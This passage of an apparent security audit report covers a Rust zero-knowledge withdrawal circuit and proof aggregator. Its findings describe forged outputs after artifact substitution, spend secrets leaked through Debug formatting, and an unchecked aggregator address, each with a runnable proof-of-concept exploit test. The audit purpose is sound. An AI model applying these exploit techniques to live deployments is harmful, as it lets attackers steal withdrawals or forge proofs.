    let parsed = parse_public_inputs(&verifier_proof).expect("parse leaf public inputs");
    assert_eq!(parsed, CircuitInputs::test_inputs_0().public);
}

#[test]
fn poc_private_batch_accepts_substituted_leaf_verifier_and_emits_forged_outputs() {
    let bins_dir = temp_dir("private-batch-artifact-substitution");
    let (forged_leaf_proof, expected) =
        build_malicious_private_batch_bins(&bins_dir).expect("build malicious artifact set");

    let mut aggregator = PrivateBatchAggregator::new(&bins_dir)
        .expect("private-batch loader accepts substituted artifact directory");
    aggregator
        .push_proof(forged_leaf_proof)
        .expect("fake leaf proof matches expected public input length");

    let aggregated = aggregator
        .aggregate()
        .expect("aggregation should succeed against substituted leaf verifier data");
    aggregator
        .verify(aggregated.clone())
        .expect("aggregated proof should verify against the substituted private-batch artifacts");

    let parsed = parse_private_batch_from_plonky2(&aggregated);
    assert_eq!(parsed.asset_id, expected.asset_id);
    assert_eq!(parsed.volume_fee_bps, expected.volume_fee_bps);
    assert_eq!(parsed.block_data.block_hash, expected.block_hash);
    assert_eq!(parsed.block_data.block_number, expected.block_number);
    assert_eq!(parsed.nullifiers, vec![expected.nullifier]);
    assert_eq!(parsed.num_unique_exits, 2);
    assert_eq!(parsed.account_data.len(), 2);
    assert_eq!(parsed.account_data[0].summed_output_amount, expected.output_amount_1);
    assert_eq!(parsed.account_data[0].exit_account, expected.exit_account_1);
    assert_eq!(parsed.account_data[1].summed_output_amount, expected.output_amount_2);
    assert_eq!(parsed.account_data[1].exit_account, expected.exit_account_2);

    let _ = fs::remove_dir_all(&bins_dir);
}
```

### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   wormhole/tests/tests/poc.rs

# install dependencies
cargo +'1.93.0' fetch --locked --manifest-path 'Cargo.toml'

# build and run
cargo build --tests --workspace
cargo test -p tests --test poc
```

### Output

```
[output truncated: 29 lines & 1.0390625 KB skipped]


</test-stdout>

<test-stderr>
   Compiling tests v3.0.0 (/repo/wormhole/tests)
    Finished `test` profile [unoptimized + debuginfo] target(s) in 1.43s
     Running tests/poc.rs (target/debug/deps/poc-76feceaa046eb0ff)

</test-stderr>
```

### Considerations

PoC covers two native public-entrypoint exploit paths only: (1) `WormholeVerifier::new_from_bytes` accepts attacker-supplied Wormhole artifacts with a weaker but still buildable `security_bits` target and then verifies a proof under that downgraded profile; it does not empirically forge a false statement from the soundness reduction alone. (2) `PrivateBatchAggregator` is exercised end-to-end with substituted leaf/common/verifier artifacts and matching private-batch binaries, proving forged payout/nullifier/header public inputs can be aggregated and verified; the PoC stops at private-batch and does not extend the same substituted-artifact chain into public-batch.

### Validation reasoning

PoC validation command completed successfully.

---

# Debug formatting leaks spend-authorizing witness secrets
**#97072**
- Severity: High
- Validity: Unreviewed

## Source locations

### `wormhole/circuit/src/lib.rs`
#### Lines 5-13 — _Publicly exports the modules containing the secret-bearing input and witness types._

```
pub mod block_header;
pub mod circuit;
pub mod inputs;
pub mod nullifier;
#[cfg(feature = "profile")]
pub mod profile;
pub mod substrate_account;
pub mod unspendable_account;
pub mod zk_merkle_proof; // 4-ary Poseidon Merkle proof
```

### `wormhole/circuit/src/inputs.rs`
#### Lines 23-65 — _`CircuitInputs` and `PrivateCircuitInputs` derive `Debug` while storing the raw secret and full private proof witness._

```
/// Inputs required to commit to the wormhole circuit.
#[derive(Debug, Clone)]
pub struct CircuitInputs {
    pub public: PublicCircuitInputs,
    pub private: PrivateCircuitInputs,
}

/// All of the private inputs required for the circuit.
#[derive(Debug, Clone)]
pub struct PrivateCircuitInputs {
    /// Raw bytes of the secret of the nullifier and the unspendable account
    pub secret: BytesDigest,
    /// Transfer count for this recipient
    pub transfer_count: u64,
    /// The unspendable account hash (recipient of the transfer).
    pub unspendable_account: BytesDigest,
    /// The parent hash of the block header (private - used to compute block_hash)
    pub parent_hash: BytesDigest,
    /// The state root of the block (still needed for block hash computation)
    pub state_root: BytesDigest,
    /// The extrinsics root of the block header
    pub extrinsics_root: BytesDigest,
    /// The digest logs of the block header
    pub digest: [u8; DIGEST_LOGS_SIZE],
    /// The input amount from storage (before fee deduction). This value is quantized with 0.01 units of precision.
    /// The circuit verifies that output_amount <= input_amount - (input_amount * volume_fee_bps / 10000).
    pub input_amount: u32,

    // === ZK Merkle Proof fields (replaces old MPT storage_proof) ===
    /// Root of the ZK tree (from block header's zk_tree_root field).
    /// This is used for both:
    /// - Block hash computation (as part of the header preimage)
    /// - ZK Merkle proof verification (compared against computed root)
    ///
    /// The circuit constrains these two uses to be equal.
    pub zk_tree_root: [u8; 32],
    /// Sibling hashes at each level of the 4-ary Merkle proof.
    /// Each level has 3 siblings in **sorted order** (excluding current hash).
    pub zk_merkle_siblings: Vec<[[u8; 32]; SIBLINGS_PER_LEVEL]>,
    /// Position hints (0-3) for each level indicating where current hash
    /// should be inserted among the sorted siblings.
    pub zk_merkle_positions: Vec<u8>,
}
```

### `wormhole/circuit/src/nullifier.rs`
#### Lines 49-91 — _`Nullifier` derives `Debug` and stores the secret used to derive the nullifier._

```
#[derive(Debug, PartialEq, Eq, Clone)]
pub struct Nullifier {
    pub hash: Digest,
    /// Secret encoded with 8 bytes/felt (4 field elements for 32 bytes)
    pub secret: Secret,
    transfer_count: [F; TRANSFER_COUNT_NUM_TARGETS],
}

impl Nullifier {
    pub fn new(digest: BytesDigest, secret: BytesDigest, transfer_count: u64) -> Self {
        let hash = bytes_to_digest(digest);
        // Use 8 bytes/felt encoding.
        let secret = bytes_to_digest(secret);
        let transfer_count = u64_to_felts(transfer_count);

        Self {
            hash,
            secret,
            transfer_count,
        }
    }

    pub fn from_preimage(secret: BytesDigest, transfer_count: u64) -> Self {
        let mut preimage = Vec::new();

        let salt = string_to_felts(NULLIFIER_SALT);
        let secret_felts = bytes_to_digest(secret);
        let transfer_count_felts = u64_to_felts(transfer_count);

        preimage.extend(salt);
        preimage.extend(secret_felts);
        preimage.extend(transfer_count_felts);

        let inner_hash = Poseidon2Hash::hash_no_pad(&preimage).elements;
        let outer_hash = Poseidon2Hash::hash_no_pad(&inner_hash).elements;
        let hash = Digest::from(outer_hash);

        Self {
            hash,
            secret: secret_felts,
            transfer_count: transfer_count_felts,
        }
    }
```

### `wormhole/circuit/src/unspendable_account.rs` (2 locations)
#### Lines 27-77 — _`UnspendableAccount` derives `Debug`, stores the live proof secret, and serializes it back into bytes._ — _`UnspendableAccount` derives `Debug` and stores the secret used to derive the unspendable account._ — _`Debug` is derived on the public struct that stores the secret field._ — _The account id is derived from the secret by double hashing `salt || secret`._ — _The codec serializes `self.secret` back into bytes, showing the field elements encode the underlying 32-byte secret._

```
#[derive(Debug, PartialEq, Eq, Clone)]
pub struct UnspendableAccount {
    /// Account ID as 4 field elements (8 bytes/felt for hash output)
    pub account_id: Digest,
    /// Secret encoded as 4 field elements (8 bytes/felt for 32 bytes)
    pub secret: Secret,
}

impl UnspendableAccount {
    pub fn from_secret(secret: BytesDigest) -> Self {
        ...
        Self {
            account_id: outer_hash,
            secret: secret_felts,
        }
    }
}

impl ByteCodec for UnspendableAccount {
    fn to_bytes(&self) -> Vec<u8> {
        let mut bytes = Vec::new();
        bytes.extend(*digest_to_bytes(self.account_id));
        bytes.extend(*digest_to_bytes(self.secret));
        bytes
    }
}
```

⋯
#### Lines 171-194 — _Circuit constraint proves the account id from `salt + secret`._

```
    /// Builds a circuit that asserts that the `account_id` was generated from `H(H(salt+secret))`.
    ///
    /// The circuit computes the hash (4 felts) and directly compares with account_id (also 4 felts).
    fn circuit(
        Self::Targets { account_id, secret }: &Self::Targets,
        builder: &mut CircuitBuilder<F, D>,
    ) {
        let salt = string_to_felts(UNSPENDABLE_SALT);
        let mut preimage = Vec::new();
        for felt in salt {
            preimage.push(builder.constant(felt));
        }
        preimage.extend(secret.elements.iter());

        // Compute the hash by double-hashing the preimage (salt + secret).
        // Result is 4 field elements (HashOut).
        let inner_hash = builder.hash_n_to_hash_no_pad_p2::<Poseidon2Hash>(preimage.clone());
        let outer_hash =
            builder.hash_n_to_hash_no_pad_p2::<Poseidon2Hash>(inner_hash.elements.to_vec());

        // Assert that the computed hash matches the provided account_id (both are 4 felts)
        for i in 0..4 {
            builder.connect(outer_hash.elements[i], account_id.elements[i]);
        }
```

### `wormhole/circuit/src/circuit.rs` (2 locations)
#### Lines 228-248 — _The unspendable account secret is connected to the nullifier secret, and its account id is bound to the Merkle leaf recipient._

```
        builder.connect_hashes(targets.nullifier.secret, targets.unspendable_account.secret);

        // Transfer count: connect nullifier's transfer_count to zk_merkle_proof's
        for (&a, &b) in targets
            .nullifier
            .transfer_count
            .iter()
            .zip(&targets.zk_merkle_proof.leaf.transfer_count)
        {
            builder.connect(a, b);
        }

        // to_account and unspendable_account must be the same (both are 4 felts)
        for (&a, &b) in targets
            .unspendable_account
            .account_id
            .elements
            .iter()
            .zip(&targets.zk_merkle_proof.leaf.to_account.elements)
        {
            builder.connect(a, b);
```

⋯
#### Lines 282-304 — _Circuit constraint proves the nullifier from `salt + secret + transfer_count`._ — _The same secret is used to enforce the public nullifier for non-dummy proofs._

```
        // Nullifier validation: nullifier == H(H(salt + secret + transfer_count))
        // Skip this validation for dummy proofs (block_hash == 0 AND outputs == 0).
        // This allows dummy proofs to use random nullifiers for better privacy.
        let salt_felts = string_to_felts(NULLIFIER_SALT);
        let mut nullifier_preimage = Vec::new();
        for &f in salt_felts.iter() {
            nullifier_preimage.push(builder.constant(f));
        }
        nullifier_preimage.extend(targets.nullifier.secret.elements.iter().copied());
        nullifier_preimage.extend(targets.nullifier.transfer_count.iter());

        let inner_hash = builder.hash_n_to_hash_no_pad_p2::<Poseidon2Hash>(nullifier_preimage);
        let computed_nullifier =
            builder.hash_n_to_hash_no_pad_p2::<Poseidon2Hash>(inner_hash.elements.to_vec());

        for i in 0..4 {
            let diff = builder.sub(
                targets.nullifier.hash.elements[i],
                computed_nullifier.elements[i],
            );
            let result = builder.mul(diff, is_not_dummy);
            builder.connect(result, zero);
        }
```

### `wormhole/circuit/src/substrate_account.rs`
#### Lines 144-150 — _Exit accounts are public-input targets and are not constrained to the private secret._

```
impl CircuitFragment for DualExitAccount {
    type Targets = DualExitAccountTargets;

    /// Builds a dummy circuit to include both exit accounts as public inputs.
    fn circuit(_targets: &Self::Targets, _builder: &mut CircuitBuilder<F, D>) {
        // No constraints needed - exit accounts are just public inputs
    }
```

### `wormhole/prover/src/lib.rs`
#### Lines 289-303 — _Witness filling constructs and commits the unspendable account from private circuit inputs._

```
    let nullifier = Nullifier::from(circuit_inputs);
    let zk_merkle_proof = ZkMerkleProofData::try_from(circuit_inputs)?;
    let unspendable_account = UnspendableAccount::from(circuit_inputs);
    let exit_accounts = DualExitAccount {
        exit_account_1: SubstrateAccount::from_bytes(
            circuit_inputs.public.exit_account_1.as_slice(),
        )?,
        exit_account_2: SubstrateAccount::from_bytes(
            circuit_inputs.public.exit_account_2.as_slice(),
        )?,
    };
    let block_header = BlockHeader::try_from(circuit_inputs)?;

    nullifier.fill_targets(pw, targets.nullifier.clone())?;
    unspendable_account.fill_targets(pw, targets.unspendable_account.clone())?;
```

## Description

Several reusable witness types in the circuit crate derive Rust's default `Debug` while carrying the live withdrawal secret and the rest of the private proving witness. This includes `CircuitInputs`/`PrivateCircuitInputs`, `Nullifier`, and `UnspendableAccount`, all of which expose data that is directly used to satisfy the circuit's spend-authorizing relations. The circuit explicitly connects `unspendable_account.secret` to `nullifier.secret`, proves `account_id == H(H(salt + secret))`, and proves the public nullifier from `H(H(salt + secret + transfer_count))`, so the logged values are not harmless metadata. `UnspendableAccount::to_bytes` also shows that the stored field elements encode the underlying secret bytes rather than an irreversible redaction. Because exit accounts are only public inputs with no constraint tying them to the secret, anyone who obtains a debug dump of these types can pair the leaked witness with attacker-chosen payout accounts until the nullifier is consumed.

## Root cause

Secret-bearing witness types are exported and implemented with default `Debug` formatting instead of redacting or omitting confidential fields such as `secret` and other private proving inputs.

## Impact

An operator, log reader, or crash-report recipient who sees `{:?}` output for these types can recover the private witness needed to generate a competing withdrawal proof. If they submit first, they can spend the transfer to attacker-controlled `exit_account` values before the legitimate user, while also learning confidential proof inputs that were expected to remain private.

## Proof of concept

### Test case

```
use anyhow::{Context, Result};
use plonky2::{
    plonk::circuit_data::CircuitConfig,
    util::serialization::DefaultGateSerializer,
};
use qp_wormhole_inputs::{BytesDigest, PublicCircuitInputs};
use test_helpers::{
    block_header::{
        DEFAULT_BLOCK_NUMBERS, DEFAULT_DIGESTS, DEFAULT_EXTRINSICS_ROOTS, DEFAULT_PARENT_HASHES,
        DEFAULT_STATE_ROOTS,
    },
    compute_zk_leaf_hash, TestInputs,
};
use wormhole_circuit::{
    block_header::header::HeaderInputs,
    circuit::circuit_logic::WormholeCircuit,
    inputs::{CircuitInputs, PrivateCircuitInputs},
    nullifier::Nullifier,
    unspendable_account::UnspendableAccount,
};
use wormhole_prover::WormholeProver;
use wormhole_verifier::WormholeVerifier;
use zk_circuits_common::utils::digest_to_bytes;

const CIRCUIT_CONFIG: CircuitConfig = CircuitConfig::standard_recursion_config();

fn extract_secret_from_debug(debug_dump: &str) -> Result<BytesDigest> {
    let marker = "secret: BytesDigest(0x";
    let start = debug_dump
        .find(marker)
        .context("secret marker missing from CircuitInputs debug output")?
        + marker.len();
    let end = debug_dump[start..]
        .find(')')
        .context("secret terminator missing from CircuitInputs debug output")?
        + start;
    let leaked_hex = &debug_dump[start..end];
    let leaked_bytes = hex::decode(leaked_hex).context("failed to hex-decode leaked secret")?;
    BytesDigest::try_from(leaked_bytes.as_slice()).context("leaked secret is not a valid BytesDigest")
}

fn build_verifier() -> WormholeVerifier {
    let verifier_data = WormholeCircuit::new(CIRCUIT_CONFIG).build_verifier();
    let common_bytes = verifier_data
        .common
        .to_bytes(&DefaultGateSerializer)
        .expect("serialize verifier common data");
    let verifier_bytes = verifier_data
        .verifier_only
        .to_bytes()
        .expect("serialize verifier-only data");
    WormholeVerifier::new_from_bytes(&verifier_bytes, &common_bytes).expect("build verifier")
}

fn prove_and_verify(inputs: &CircuitInputs) -> Result<wormhole_verifier::PublicCircuitInputs> {
    let proof = WormholeProver::new(CIRCUIT_CONFIG)
        .commit(inputs)
        .context("commit failed")?
        .prove()
        .context("prove failed")?;

    let verifier = build_verifier();
    let verifier_proof = wormhole_verifier::ProofWithPublicInputs::from_bytes(
        proof.to_bytes(),
        &verifier.circuit_data.common,
    )
    .context("deserialize proof for verifier")?;
    verifier
        .verify_ref(&verifier_proof)
        .context("independent verification failed")?;
    wormhole_verifier::parse_public_inputs(&verifier_proof)
        .context("failed to parse verifier public inputs")
}

fn make_live_inputs(
    secret: BytesDigest,
    transfer_count: u64,
    input_amount: u32,
    volume_fee_bps: u32,
    output_amount_1: u32,
    output_amount_2: u32,
    exit_account_1: BytesDigest,
    exit_account_2: BytesDigest,
) -> Result<CircuitInputs> {
    let unspendable_account = digest_to_bytes(UnspendableAccount::from_secret(secret).account_id);
    let nullifier = digest_to_bytes(Nullifier::from_preimage(secret, transfer_count).hash);
    let zk_tree_root = compute_zk_leaf_hash(&unspendable_account, transfer_count, 0, input_amount);
    let zk_tree_root_digest = BytesDigest::try_from(zk_tree_root).unwrap();

    let header = HeaderInputs::new(
        BytesDigest::try_from(DEFAULT_PARENT_HASHES[0]).unwrap(),
        DEFAULT_BLOCK_NUMBERS[0],
        BytesDigest::try_from(DEFAULT_STATE_ROOTS[0]).unwrap(),
        DEFAULT_EXTRINSICS_ROOTS[0].try_into().unwrap(),
        zk_tree_root_digest,
        &DEFAULT_DIGESTS[0],
    )?;
    let block_hash = header.block_hash();

    Ok(CircuitInputs {
        public: PublicCircuitInputs {
            asset_id: 0,
            output_amount_1,
            output_amount_2,
            volume_fee_bps,
            nullifier,
            exit_account_1,
            exit_account_2,
            block_hash,
            block_number: DEFAULT_BLOCK_NUMBERS[0],
        },
        private: PrivateCircuitInputs {
            secret,
            transfer_count,
            unspendable_account,
            parent_hash: BytesDigest::try_from(DEFAULT_PARENT_HASHES[0]).unwrap(),
            state_root: BytesDigest::try_from(DEFAULT_STATE_ROOTS[0]).unwrap(),
            extrinsics_root: DEFAULT_EXTRINSICS_ROOTS[0].try_into().unwrap(),
            digest: DEFAULT_DIGESTS[0],
            input_amount,
            zk_tree_root,
            zk_merkle_siblings: vec![],
            zk_merkle_positions: vec![],
        },
    })
}

#[test]
fn debug_dump_leaks_spend_secret_and_enables_competing_proof() -> Result<()> {
    let fixture = CircuitInputs::test_inputs_0();
    let victim_secret = fixture.private.secret;
    let transfer_count = fixture.private.transfer_count;
    let input_amount = fixture.private.input_amount;

    let victim_exit_1 = BytesDigest::try_from([0x11u8; 32]).unwrap();
    let victim_exit_2 = BytesDigest::try_from([0x22u8; 32]).unwrap();
    let attacker_exit_1 = BytesDigest::try_from([0x33u8; 32]).unwrap();
    let attacker_exit_2 = BytesDigest::try_from([0x44u8; 32]).unwrap();

    // Positive outputs + non-zero block hash keep the full spend-authorizing path live.
    let victim_inputs = make_live_inputs(
        victim_secret,
        transfer_count,
        input_amount,
        100,
        60,
        39,
        victim_exit_1,
        victim_exit_2,
    )?;

    let circuit_inputs_dump = format!("{:?}", victim_inputs);
    assert!(
        circuit_inputs_dump.contains("secret: BytesDigest(0x"),
        "CircuitInputs debug output should expose the private secret field"
    );

    let nullifier_dump = format!("{:?}", Nullifier::from(&victim_inputs));
    assert!(
        nullifier_dump.contains("secret:"),
        "Nullifier debug output should expose the secret-bearing field"
    );

    let unspendable_dump = format!("{:?}", UnspendableAccount::from(&victim_inputs));
    assert!(
        unspendable_dump.contains("secret:"),
        "UnspendableAccount debug output should expose the secret-bearing field"
    );

    let leaked_secret = extract_secret_from_debug(&circuit_inputs_dump)?;
    assert_eq!(leaked_secret, victim_secret, "debug dump should recover the live witness secret");

    let victim_public_inputs = prove_and_verify(&victim_inputs)?;
    assert_eq!(victim_public_inputs.exit_account_1, victim_exit_1);
    assert_eq!(victim_public_inputs.exit_account_2, victim_exit_2);
    assert_eq!(victim_public_inputs.output_amount_1, 60);
    assert_eq!(victim_public_inputs.output_amount_2, 39);

    // Attacker reuses only the leaked secret plus public chain data to build a competing proof
    // that preserves the same nullifier but redirects payouts to attacker-controlled accounts.
    let attacker_inputs = make_live_inputs(
        leaked_secret,
        transfer_count,
        input_amount,
        100,
        60,
        39,
        attacker_exit_1,
        attacker_exit_2,
    )?;
    let attacker_public_inputs = prove_and_verify(&attacker_inputs)?;

    assert_eq!(
        attacker_public_inputs.nullifier, victim_public_inputs.nullifier,
        "the competing proof spends the same transfer/nullifier"
    );
    assert_eq!(
        attacker_public_inputs.block_hash, victim_public_inputs.block_hash,
        "the competing proof binds to the same block witness"
    );
    assert_ne!(
        attacker_public_inputs.exit_account_1, victim_public_inputs.exit_account_1,
        "the leaked witness can be re-proved with a different primary payout account"
    );
    assert_ne!(
        attacker_public_inputs.exit_account_2, victim_public_inputs.exit_account_2,
        "the leaked witness can be re-proved with a different change payout account"
    );

    Ok(())
}
```

### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   wormhole/tests/tests/poc.rs

# install dependencies
cargo +'1.93.0' fetch --locked --manifest-path 'Cargo.toml'

# build and run
cargo build --tests --workspace
cargo test -p tests --test poc
```

### Output

```
[output truncated: 27 lines & 0.841796875 KB skipped]


</test-stdout>

<test-stderr>
   Compiling tests v3.0.0 (/repo/wormhole/tests)
    Finished `test` profile [unoptimized + debuginfo] target(s) in 1.11s
     Running tests/poc.rs (target/debug/deps/poc-76feceaa046eb0ff)

</test-stderr>
```

### Considerations

PoC demonstrates native secret exfiltration from `Debug` output and successful generation/verification of two distinct valid leaf proofs that share the same spend nullifier/block witness but pay different exit accounts. It does not execute a downstream settlement/nullifier-consumption service, so the front-run/race outcome is inferred from the verified duplicate-spend proofs rather than exercised against an external consumer.

### Validation reasoning

PoC validation command completed successfully.

---

# Aggregator Address Not Verified
**#96981**
- Severity: Medium
- Validity: Unreviewed

## Source locations

### `wormhole/aggregator/src/aggregator.rs` (3 locations)
#### Lines 147-170 — _The backend stores a configured aggregator address during construction._

```
pub struct PublicBatchAggregator {
    bins_dir: PathBuf,
    aggregator_address: BytesDigest,
    buf: ProofBuffer,
    expected_private_batch_pi_len: usize,
}

impl PublicBatchAggregator {
    pub fn new<P: AsRef<Path>>(bins_dir: P, aggregator_address: BytesDigest) -> Result<Self> {
        let bins_dir = bins_dir.as_ref().to_path_buf();

        // Load config
        let config = CircuitBinsConfig::load(&bins_dir)?;

        let num_private_batch_proofs = config
            .num_private_batch_proofs
            .ok_or_else(|| anyhow!("config is missing num_private_batch_proofs. Please regenerate the binaries and set \"num_private_batch_proofs\""))?;
        let expected_private_batch_pi_len =
            load_common_from_bins(&bins_dir, "private_batch_common.bin")?.num_public_inputs;

        Ok(Self {
            bins_dir,
            aggregator_address,
            buf: ProofBuffer::new(num_private_batch_proofs),
```

⋯
#### Lines 216-220 — _Locally produced proofs are committed with the configured address._

```
        let prover = prover
            .commit(PublicBatchInputs {
                proofs: batch,
                aggregator_address: self.aggregator_address,
            })
```

⋯
#### Lines 226-230 — _Verification only runs the recursive verifier and performs no address comparison._

```
    fn verify(&self, proof: Proof) -> Result<()> {
        let verifier = self.load_verifier()?;
        verifier
            .verify(proof)
            .map_err(|e| anyhow!("public-batch aggregated proof verification failed: {}", e))
```

### `wormhole/aggregator/src/public_batch/prover/lib.rs`
#### Lines 224-257 — _The public-batch prover accepts the address as caller-supplied input and commits it into the witness._

```
    pub fn commit(mut self, inputs: PublicBatchInputs) -> Result<Self> {
        let Some(targets) = self.targets.take() else {
            bail!("public-batch aggregation prover has already committed to inputs");
        };

        let mut proofs = inputs.proofs;
        let aggregator_address = inputs.aggregator_address;

        let aggregator_address_felts = bytes_to_digest(aggregator_address);

        if proofs.is_empty() {
            bail!("no private-batch proofs to aggregate");
        }
        if proofs.len() > self.num_private_batch_proofs {
            bail!(
                "Expected at most {} private-batch proofs, but got {}",
                self.num_private_batch_proofs,
                proofs.len()
            );
        }

        // Pad partial batches with the dummy template. No shuffle: forwarding is
        // order-preserving by design (per-segment attribution on-chain).
        let num_dummies_needed = self.num_private_batch_proofs - proofs.len();
        for _ in 0..num_dummies_needed {
            proofs.push(self.dummy_proof_template.clone());
        }

        fill_public_batch_witness(
            &mut self.partial_witness,
            &targets,
            &proofs,
            aggregator_address_felts,
        )?;
```

### `wormhole/aggregator/src/public_batch/prover/witness.rs`
#### Lines 27-33 — _The address limbs are written directly into witness targets._

```
    for (target, value) in targets
        .aggregator_address
        .iter()
        .zip(aggregator_address.iter())
    {
        pw.set_target(*target, *value)?;
    }
```

### `wormhole/aggregator/src/public_batch/circuit/circuit_logic.rs`
#### Lines 231-232 — _The circuit exposes the address targets as public inputs rather than fixing them to a verifier-side constant._

```
    // 1) Aggregator address (witness target, 4 felts, 8 bytes/felt)
    output_pis.extend_from_slice(&targets.aggregator_address);
```

## Description

`PublicBatchAggregator` stores a configured `aggregator_address` and uses it when it produces a public-batch proof, but its verifier does not bind an externally supplied proof to that configured address. The public-batch prover API accepts `aggregator_address` as an ordinary input, writes it into virtual witness targets, and the circuit exposes those targets as public inputs rather than constraining them to an artifact- or verifier-fixed constant. `PublicBatchAggregator::verify` only runs the Plonky2 verifier against `public_batch_common.bin` and `public_batch_verifier.bin`; it never parses the proof’s first four public inputs or compares them against `self.aggregator_address`. As a result, a valid proof generated with the same public-batch circuit but a different aggregator address is accepted by a backend instance configured for another aggregator. Any downstream service that relies on this verifier method to enforce delegated-aggregator identity receives a successful verification for a proof that was not produced under the configured identity.

## Root cause

`PublicBatchAggregator::verify` validates only the proof relation and omits an application-level public-input check that the proof’s `aggregator_address` equals the backend’s configured `aggregator_address`.

## Impact

An attacker can submit a valid public-batch proof carrying an arbitrary aggregator address and have it pass verification through a backend configured for a different address. This can bypass delegated aggregation authorization or misattribute proof outputs in systems that trust `PublicBatchAggregator::verify` as the identity check instead of separately parsing and comparing public inputs.

## Proof of concept

### Test case

```
use circuit_builder::generate_all_circuit_binaries;
use plonky2::field::types::PrimeField64;
use qp_wormhole_inputs::{BytesDigest, PublicBatchPublicInputs};
use std::path::PathBuf;
use std::time::{SystemTime, UNIX_EPOCH};
use test_helpers::{
    block_header::{
        DEFAULT_BLOCK_NUMBERS, DEFAULT_DIGESTS, DEFAULT_EXTRINSICS_ROOTS, DEFAULT_PARENT_HASHES,
        DEFAULT_STATE_ROOTS,
    },
    compute_zk_leaf_hash, DEFAULT_EXIT_ACCOUNT, DEFAULT_INPUT_AMOUNTS, DEFAULT_OUTPUT_AMOUNTS,
    DEFAULT_SECRETS, DEFAULT_TRANSFER_COUNTS, DEFAULT_VOLUME_FEE_BPS,
};
use wormhole_aggregator::aggregator::{
    AggregationBackend, PrivateBatchAggregator, PublicBatchAggregator,
};
use wormhole_circuit::{
    block_header::header::HeaderInputs,
    inputs::{CircuitInputs, PrivateCircuitInputs},
    nullifier::Nullifier,
    unspendable_account::UnspendableAccount,
};
use wormhole_prover::WormholeProver;
use zk_circuits_common::utils::{digest_to_bytes, BytesDigest as CommonBytesDigest};

fn unique_temp_dir() -> PathBuf {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("clock went backwards")
        .as_nanos();
    std::env::temp_dir().join(format!("qp-wormhole-poc-{nanos}"))
}

fn make_non_dummy_leaf_inputs() -> CircuitInputs {
    let secret: CommonBytesDigest = hex::decode(DEFAULT_SECRETS[0])
        .expect("secret hex")
        .as_slice()
        .try_into()
        .expect("32-byte secret");
    let nullifier = digest_to_bytes(Nullifier::from_preimage(secret, DEFAULT_TRANSFER_COUNTS[0]).hash);
    let unspendable_account = digest_to_bytes(UnspendableAccount::from_secret(secret).account_id);
    let exit_account = BytesDigest::try_from(DEFAULT_EXIT_ACCOUNT).expect("canonical exit account");

    let zk_tree_root = compute_zk_leaf_hash(
        &unspendable_account,
        DEFAULT_TRANSFER_COUNTS[0],
        0,
        DEFAULT_INPUT_AMOUNTS[0],
    );
    let zk_tree_root_digest = BytesDigest::try_from(zk_tree_root).expect("canonical zk root");

    let parent_hash = BytesDigest::try_from(DEFAULT_PARENT_HASHES[0]).expect("parent hash");
    let state_root = BytesDigest::try_from(DEFAULT_STATE_ROOTS[0]).expect("state root");
    let extrinsics_root =
        BytesDigest::try_from(DEFAULT_EXTRINSICS_ROOTS[0]).expect("extrinsics root");
    let block_number = DEFAULT_BLOCK_NUMBERS[0];
    let block_hash = HeaderInputs::new(
        parent_hash,
        block_number,
        state_root,
        extrinsics_root,
        zk_tree_root_digest,
        &DEFAULT_DIGESTS[0],
    )
    .expect("header inputs")
    .block_hash();

    CircuitInputs {
        public: qp_wormhole_inputs::PublicCircuitInputs {
            asset_id: 0,
            output_amount_1: DEFAULT_OUTPUT_AMOUNTS[0],
            output_amount_2: 0,
            volume_fee_bps: DEFAULT_VOLUME_FEE_BPS,
            nullifier,
            exit_account_1: exit_account,
            exit_account_2: BytesDigest::default(),
            block_hash,
            block_number,
        },
        private: PrivateCircuitInputs {
            secret,
            transfer_count: DEFAULT_TRANSFER_COUNTS[0],
            unspendable_account,
            parent_hash,
            state_root,
            extrinsics_root,
            digest: DEFAULT_DIGESTS[0],
            input_amount: DEFAULT_INPUT_AMOUNTS[0],
            zk_tree_root,
            zk_merkle_siblings: vec![],
            zk_merkle_positions: vec![],
        },
    }
}

#[test]
fn public_batch_verify_accepts_proof_for_different_aggregator_address() {
    let bins_dir = unique_temp_dir();
    std::fs::create_dir_all(&bins_dir).expect("create temp dir");

    generate_all_circuit_binaries(&bins_dir, true, 1, Some(1))
        .expect("generate leaf/private/public batch binaries");

    let inputs = make_non_dummy_leaf_inputs();
    let leaf_prover = WormholeProver::new_from_files(&bins_dir.join("prover.bin"), &bins_dir.join("common.bin"))
        .expect("load leaf prover from generated binaries");
    let leaf_proof = leaf_prover
        .commit(&inputs)
        .expect("commit leaf inputs")
        .prove()
        .expect("prove leaf");

    let mut private_batch = PrivateBatchAggregator::new(&bins_dir).expect("private batch aggregator");
    private_batch.push_proof(leaf_proof).expect("push leaf proof");
    let private_batch_proof = private_batch.aggregate().expect("aggregate private batch");
    private_batch
        .verify(private_batch_proof.clone())
        .expect("private batch proof should verify");

    let attacker_address = BytesDigest::try_from([1u8; 32]).expect("attacker address");
    let victim_address = BytesDigest::try_from([2u8; 32]).expect("victim address");
    assert_ne!(attacker_address, victim_address, "sanity: addresses must differ");

    let mut attacker_aggregator =
        PublicBatchAggregator::new(&bins_dir, attacker_address).expect("attacker public aggregator");
    attacker_aggregator
        .push_proof(private_batch_proof)
        .expect("push private batch proof");
    let malicious_public_batch_proof = attacker_aggregator.aggregate().expect("attacker aggregates proof");

    let parsed_u64s: Vec<u64> = malicious_public_batch_proof
        .public_inputs
        .iter()
        .map(|f| f.to_canonical_u64())
        .collect();
    let parsed = PublicBatchPublicInputs::try_from_u64_slice(&parsed_u64s, 1, 1)
        .expect("parse public batch inputs");
    assert_eq!(
        parsed.aggregator_address,
        attacker_address,
        "proof exposes attacker-controlled aggregator address"
    );
    assert_ne!(
        parsed.aggregator_address,
        victim_address,
        "proof is not bound to victim aggregator address"
    );
    assert_ne!(
        parsed.block_data.block_hash,
        BytesDigest::default(),
        "proof is a non-dummy public batch"
    );
    assert!(
        parsed.account_data.iter().any(|slot| slot.summed_output_amount > 0),
        "proof should carry a real forwarded payout slot"
    );

    let victim_aggregator =
        PublicBatchAggregator::new(&bins_dir, victim_address).expect("victim public aggregator");
    victim_aggregator
        .verify(malicious_public_batch_proof)
